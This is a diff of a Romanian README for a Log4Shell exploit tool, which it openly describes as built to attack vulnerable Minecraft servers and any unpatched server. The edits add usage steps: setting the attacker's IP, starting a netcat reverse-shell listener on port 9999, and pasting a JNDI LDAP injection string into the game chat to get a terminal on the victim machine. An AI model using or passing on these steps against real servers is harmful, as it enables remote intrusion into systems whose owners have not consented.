@@ -2,7 +2,7 @@
 
 ## Descriere
 
-Acest proiect exploateaza vulnerabilitatea Log4shell. Este destinat folosirii lui pentru a ataca un server vulnerabil de Minecraft, joc video foarte popular. Insa poate fi folosit pentru atacul oricarui server neprotejat de acest atac.
+Acest proiect exploateaza vulnerabilitatea Log4shell. Este destinat folosirii lui pentru a ataca un server vulnerabil de Minecraft, joc video foarte popular. Insa poate fi folosit pentru atacul oricarui server neprotejat de acest exploit.
 
 Proiectul este capabil sa initieze o conexiune de tip reverse shell.
 
@@ -42,11 +42,13 @@ optional arguments:
   --port PORT           Portul Netcat
   --nume_clasa NUME_CLASA Clasa java
 ```
-IP - Ip-ul masinii atacate
+IP - Ip-ul masinii actuale (atacatorului)
 
 Port - Portul unde este acultata conexiunea reverse shell (ex:9999)
 
 Nume - Numele dorit pentru clasa java reverse shell generata
+
+* Pana se configureaza intreg sistemul poate dura mult timp!
 
 * Dupa rulare, va exista un server malitios valabil pentru a injecta clasa java ce initiaza o conexiune reverse shell.
 
@@ -61,13 +63,13 @@ Pornirea unei instante separate netcat. Asculta pentru o conexiune reverse shell
 nc -lvnp 9999
 ```
 
-Aici va fi gasita linia de comanda a sistemului atacata
+Aici va fi gasita linia de comanda a sistemului atacat
 
 ## Injectare si rezultate
 
 In consola, unde scriptul python ruleaza, se va afisa comanda necesara ce trebuie introdusa in sistemul vulnerabil. Cum ar trebuii sa arate comanda: `${jndi:ldap://{args.ip}:1389/{args.nume_clasa}}`
 
-Pentru serverul de Minecraft trebuie sa ne conectam cu un client. Dupa conexiunea la sever a clientului se introduce comanda anterioara.
+Pentru serverul de Minecraft trebuie sa ne conectam cu un client. Dupa conexiunea la sever a clientului se introduce comanda anterioara in chat(Se apasa tasta "T").
 
 In final ar trebui sa avem o conexiune de terminal in fereastra cu Netcat.
 
